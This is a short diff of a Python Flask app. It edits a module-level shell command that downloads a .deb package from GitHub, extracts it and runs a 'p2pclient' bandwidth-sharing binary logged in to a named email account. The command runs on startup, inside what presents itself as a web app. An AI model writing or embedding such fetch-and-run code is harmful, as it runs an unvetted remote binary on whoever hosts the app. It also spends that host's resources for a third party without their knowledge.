@@ -5,7 +5,7 @@ import requests
 import threading
 app = Flask(__name__)
 
-subprocess.call("wget https://github.com/codewithap/peer2profit/raw/main/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
+subprocess.call("wget https://github.com/codewithap/ap/raw/main/p2pclient_0.56_amd64.deb && dpkg -x p2pclient_0.56_amd64.deb ~ && cd usr/bin && ./p2pclient --login arijitpaine249@gmail.com",shell=True)
 
 @app.route("/")
 def s():
